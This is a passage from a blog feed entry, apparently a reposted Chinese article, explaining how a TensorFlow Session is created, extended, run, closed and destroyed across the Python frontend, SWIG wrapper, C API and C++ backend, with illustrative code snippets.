ignoring others</span></span><br></pre></td></tr></table></figure><h1 id="生成代码：Swig"><a href="#生成代码：Swig" class="headerlink" title="生成代码：Swig"></a>生成代码：Swig</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pywrap_tensorflow.py</span><br></pre></td></tr></table></figure><p>在pywrap_tensorflow模块中，通过_pywrap_tensorflow将在_pywrap_tensorflow.so中调用对应的C++函数实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tensorflow/bazel-bin/tensorflow/python/pywrap_tensorflow.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TF_NewDeprecatedSession</span><span class="params">(arg1, status)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> _pywrap_tensorflow.TF_NewDeprecatedSession(arg1, status)</span><br></pre></td></tr></table></figure><p>在pywrap_tensorflow.cpp的具体实现中，它静态注册了函数调用的符号表，实现Python的函数名称到C++实现函数的具体映射。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tensorflow/bazel-bin/tensorflow/python/pywrap_tensorflow.cpp</span></span><br><span class="line">static PyMethodDef SwigMethods[] = &#123;</span><br><span class="line">    ...</span><br><span class="line">     &#123;<span class="string">"TF_NewDeprecatedSession"</span>, _wrap_TF_NewDeprecatedSession, METH_VARARGS, NULL&#125;,</span><br><span class="line">&#125;</span><br><span class="line">PyObject *_wrap_TF_NewDeprecatedSession(</span><br><span class="line">PyObject *self, PyObject *args) &#123;</span><br><span class="line">TF_SessionOptions* arg1 = ... </span><br><span class="line">TF_Status* arg2 = ...</span><br><span class="line"></span><br><span class="line">TF_DeprecatedSession* result = TF_NewDeprecatedSession(arg1, arg2);</span><br><span class="line">// ignoring others implements</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终，自动生成的pywrap_tensorflow.cpp仅仅负责函数调用的转发，最终将调用底层C系统向上提供的API接口。</p><h1 id="C-API：桥梁"><a href="#C-API：桥梁" class="headerlink" title="C API：桥梁"></a>C API：桥梁</h1><p><code>c_api.h</code>是TensorFlow的后端执行系统面向前端开放的公共API接口之一，自此将进入TensorFlow后端系统的浩瀚天空。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tensorflow/c/c_api.c</span></span><br><span class="line"><span class="function">TF_DeprecatedSession* <span class="title">TF_NewDeprecatedSession</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> TF_SessionOptions*, TF_Status* status)</span> </span>&#123;</span><br><span class="line">  Session* session;</span><br><span class="line">  status-&gt;status = NewSession(opt-&gt;options, &amp;session);</span><br><span class="line">  <span class="keyword">if</span> (status-&gt;status.ok()) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TF_DeprecatedSession(&#123;session&#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="后端系统：C"><a href="#后端系统：C" class="headerlink" title="后端系统：C++"></a>后端系统：C++</h1><p>NewSession将根据前端传递的Session.target，使用SessionFactory多态创建不同类型的Session(C++)对象。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">NewSession</span><span class="params">(<span class="keyword">const</span> SessionOptions&amp; options, Session** out_session)</span> </span>&#123;</span><br><span class="line">  SessionFactory* factory;</span><br><span class="line">  Status s = SessionFactory::GetFactory(options, &amp;factory);</span><br><span class="line">  <span class="keyword">if</span> (!s.ok()) &#123;</span><br><span class="line">    *out_session = <span class="literal">nullptr</span>;</span><br><span class="line">    LOG(ERROR) &lt;&lt; s;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">  &#125;</span><br><span class="line">  *out_session = factory-&gt;NewSession(options);</span><br><span class="line">  <span class="keyword">if</span> (!*out_session) &#123;</span><br><span class="line">    <span class="keyword">return</span> errors::Internal(<span class="string">"Failed to create session."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Status::OK();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="会话生命周期"><a href="#会话生命周期" class="headerlink" title="会话生命周期"></a>会话生命周期</h1><p>下文以前端Python，桥梁C API，后端C++为生命线，理顺三者之间的调用关系，阐述Session的生命周期过程。</p><p>在Python前端，Session的生命周期主要体现在：</p><p>创建Session(target)</p><p>迭代执行Session.run(fetches, feed_dict)</p><p>Session._extend_graph(graph)</p><p>Session.TF_Run(feeds, fetches, targets)</p><p>关闭Session</p><p>销毁Session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sess = Session(target)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">  batch_xs, batch_ys = mnist.train.next_batch(<span class="number">100</span>)</span><br><span class="line">  sess.run(train_step, feed_dict=&#123;x: batch_xs, y_: batch_ys&#125;)</span><br><span class="line">sess.close()</span><br></pre></td></tr></table></figure><p>相应地，C++后端，Session的生命周期主要体现在：</p><p>根据target多态创建Session</p><p>Session.Create(graph)：有且仅有一次</p><p>Session.Extend(graph)：零次或多次</p><p>迭代执行Session.Run(inputs, outputs, targets)</p><p>关闭Session.Close</p><p>销毁Session对象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create/load graph ...</span></span><br><span class="line">tensorflow::GraphDef graph;</span><br><span class="line"><span class="comment">// local runtime, target is ""</span></span><br><span class="line">tensorflow::SessionOptions options;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create Session</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;tensorflow::Session&gt; </span><br><span class="line">sess(tensorflow::NewSession(options));</span><br><span class="line"></span><br><span class="line"><span class="comment">// create graph at initialization.</span></span><br><span class="line">tensorflow::Status s = sess-&gt;Create(graph);</span><br><span class="line"><span class="keyword">if</span> (!s.ok()) &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// run step</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;tensorflow::Tensor&gt; outputs;</span><br><span class="line">s = session-&gt;Run(</span><br><span class="line">&#123;&#125;, <span class="comment">// inputs is empty </span></span><br><span class="line">&#123;<span class="string">"output:0"</span>&#125;, <span class="comment">// outputs names</span></span><br><span class="line">&#123;<span class="string">"update_state"</span>&#125;, <span class="comment">// target names</span></span><br><span class="line">&amp;outputs); <span class="comment">// output tensors</span></span><br><span class="line"><span class="keyword">if</span> (!s.ok()) &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// close</span></span><br><span class="line">session-&gt;Close();</span><br></pre></td></tr></table></figure><p>创建会话</p><p>上文介绍了Session创建的详细过程，从Python前端为起点，通过Swig自动生成的Python-C++的包装器为媒介，实现了Python到TensorFlow的C API的调用。</p><p>其中，C API是前端系统与后端系统的分水岭。后端C++系统根据前端传递的Session.target，使用SessionFactory多态创建Session(C++)对象。</p><p><img src="http://or9a8nskt.bkt.clouddn.com/15148944313909.png" alt=""></p><p>创建会话</p><p>从严格的角色意义上划分，GrpcSession依然扮演了Client的角色。它使用target，通过RPC协议与Master建立通信连接，因此，GrpcSession同时扮演了RPC Client的角色。</p><p><img src="http://or9a8nskt.bkt.clouddn.com/15148944356342.png" alt="Session多态创建"></p><h1 id="创建-扩展图"><a href="#创建-扩展图" class="headerlink" title="创建/扩展图"></a>创建/扩展图</h1><p>随后，Python前端将调用Session.run接口，将构造好的计算图，以GraphDef的形式发送给C++后端。</p><p>其中，前端每次调用Session.run接口时，都会试图将新增节点的计算图发送给后端系统，以便后端系统将新增节点的计算图Extend到原来的计算图中。特殊地，在首次调用Session.run时，将发送整个计算图给后端系统。</p><p>后端系统首次调用Session.Extend时，转调(或等价)Session.Create；以后，后端系统每次调用Session.Extend时将真正执行Extend的语义，将新增的计算图的节点追加至原来的计算图中。</p><p>随后，后端将启动计算图执行的准备工作。</p><p><img src="http://or9a8nskt.bkt.clouddn.com/15148944411026.png" alt="创建/扩展图"></p><h1 id="迭代运行"><a href="#迭代运行" class="headerlink" title="迭代运行"></a>迭代运行</h1><p>接着，Python前端Session.run实现将Feed, Fetch列表准备好，传递给后端系统。后端系统调用Session.Run接口。</p><p>后端系统的一次Session.Run执行常常被称为一次Step，Step的执行过程是TensorFlow运行时的核心。</p><p>每次Step，计算图将正向计算网络的输出，反向传递梯度，并完成一次训练参数的更新。首先，后端系统根据Feed, Fetch，对计算图(常称为Full Graph)进行剪枝，得到一个最小依赖的计算子图(常称为Client Graph)。</p><p>然后，运行时启动设备分配算法，如果节点之间的边横跨设备，则将该边分裂，插入相应的Send与Recv节点，实现跨设备节点的通信机制。</p><p>随后，将分裂出来的子图片段(常称为Partition Graph)注册到相应的设备上，并在本地设备上启动子图片段的执行过程。</p><p><img src="http://or9a8nskt.bkt.clouddn.com/15148944539577.png" alt="关闭会话"></p><p>当计算图执行完毕后，需要关闭Session，以便释放后端的系统资源，包括队列，IO等。会话关闭流程较为简单，如下图所示。</p><p><img src="media/2017041237.png" alt="关闭会话"></p><h1 id="销毁会话"><a href="#销毁会话" class="headerlink" title="销毁会话"></a>销毁会话</h1><p>最后，会话关闭之后，Python前端系统启动GC，当Session.del被调用后，启动后台C++的Session对象销毁过程。</p><p><img src="media/2017041238.png" alt="销毁会话"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://www.uml.org.cn/zjjs/201704123.asp&quot;&gt;转自&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;TensorFlow的系统结构以C API为界，将整个系统分为「前端」和「后端」两个子系统：&lt;/p&gt;
&lt;p&gt;前端系统：提供编程模型，负责构造计算
      
    
    </summary>
    
      <category term="TensorFlow" scheme="http://larryim.cc/categories/TensorFlow/"/>
    
    
      <category term="tensorflow" scheme="http://larryim.cc/tags/tensorflow/"/>
    
  </entry>
  
</feed>
